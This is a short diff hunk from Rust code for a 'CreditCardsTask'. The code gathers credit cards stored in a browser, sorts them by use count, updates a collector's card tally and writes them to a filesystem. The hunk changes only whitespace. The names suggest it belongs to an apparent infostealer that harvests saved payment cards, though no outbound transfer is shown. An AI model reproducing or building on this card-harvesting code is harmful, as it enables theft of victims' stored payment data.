@@ -41,11 +41,11 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CreditCardsTask {
         };
 
         credit_cards.sort_by(|a, b| b.use_count.cmp(&a.use_count));
-        
+
         collector
             .get_browser()
             .increase_credit_cards_by(credit_cards.len());
-        
+
         let _ = to_string_and_write_all(&credit_cards, "\n\n", filesystem, parent);
     }
 }
